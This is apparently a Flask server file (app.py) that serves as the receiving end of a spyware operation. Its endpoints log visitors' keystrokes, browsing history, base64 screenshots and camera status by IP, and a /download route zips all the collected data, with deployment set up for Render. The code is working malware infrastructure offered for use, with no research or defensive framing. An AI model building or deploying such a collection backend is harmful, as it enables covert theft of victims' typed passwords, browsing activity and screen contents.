# app.py
from flask import Flask, request, jsonify, Response
from datetime import datetime
import json
import os
import base64
import threading
import time

app = Flask(__name__)

# Data storage
data_dir = 'collected_data'
os.makedirs(data_dir, exist_ok=True)

# In-memory storage for session data
sessions = {}

@app.route('/')
def index():
    return '''
    <html>
    <head><title>Data Collection</title></head>
    <body>
    <h1>Data Collection Endpoint</h1>
    <p>This is where collected data will be stored.</p>
    </body>
    </html>
    '''

@app.route('/log', methods=['GET'])
def log_keys():
    ip = request.remote_addr
    timestamp = datetime.now().isoformat()
    key = request.args.get('key', '')
    
    # Store data
    with open(f'{data_dir}/keylog_{ip}.txt', 'a') as f:
        f.write(f'{timestamp}: {key}\n')
    
    return Response(status=200)

@app.route('/history', methods=['GET'])
def log_history():
    ip = request.remote_addr
    timestamp = datetime.now().isoformat()
    data = request.args.get('data', '')
    
    # Store data
    with open(f'{data_dir}/history_{ip}.json', 'a') as f:
        f.write(f'{timestamp}: {data}\n')
    
    return Response(status=200)

@app.route('/screenshot', methods=['GET'])
def log_screenshot():
    ip = request.remote_addr
    timestamp = datetime.now().isoformat()
    data = request.args.get('data', '')
    
    # Save image
    img_data = data.split(',')[1] if ',' in data else data
    with open(f'{data_dir}/screenshot_{ip}_{timestamp}.png', 'wb') as f:
        f.write(base64.b64decode(img_data))
    
    return Response(status=200)

@app.route('/camera', methods=['GET'])
def log_camera_status():
    ip = request.remote_addr
    timestamp = datetime.now().isoformat()
    status = request.args.get('status', 'unknown')
    
    # Store data
    with open(f'{data_dir}/camera_{ip}.txt', 'a') as f:
        f.write(f'{timestamp}: {status}\n')
    
    return Response(status=200)

@app.route('/data', methods=['POST'])
def log_all_data():
    ip = request.remote_addr
    timestamp = datetime.now().isoformat()
    
    # Store all data
    data = request.json or {}
    data['ip'] = ip
    data['timestamp'] = timestamp
    
    with open(f'{data_dir}/full_data_{ip}.json', 'a') as f:
        f.write(json.dumps(data) + '\n')
    
    return Response(status=200)

@app.route('/download', methods=['GET'])
def download_data():
    # Create archive of collected data
    import shutil
    shutil.make_archive('collected_data', 'zip', data_dir)
    
    return Response(
        open('collected_data.zip', 'rb').read(),
        mimetype='application/zip',
        headers={'Content-Disposition': 'attachment; filename=collected_data.zip'}
    )

if __name__ == '__main__':
    # Get port from Render, or use 10000 for local testing
    port = int(os.environ.get("PORT", 10000))
    
    # Run app with Gunicorn in production
    if os.environ.get('RENDER'):
        from gunicorn.app.base import BaseApplication
        
        class FlaskApplication(BaseApplication):
            def init(self, parser, opts, args):
                return {
                    'bind': f'0.0.0.0:{port}',
                    'workers': 4,
                    'timeout': 60
                }
            
            def load_config(self):
                config = self.init(None, None, None)
                for key, value in config.items():
                    self.cfg.settings[key.lower()] = value
            
            def load(self):
                return app
        
        FlaskApplication().run()
    else:
        # Local development mode
        app.run(host='0.0.0.0', port=port, debug=True)
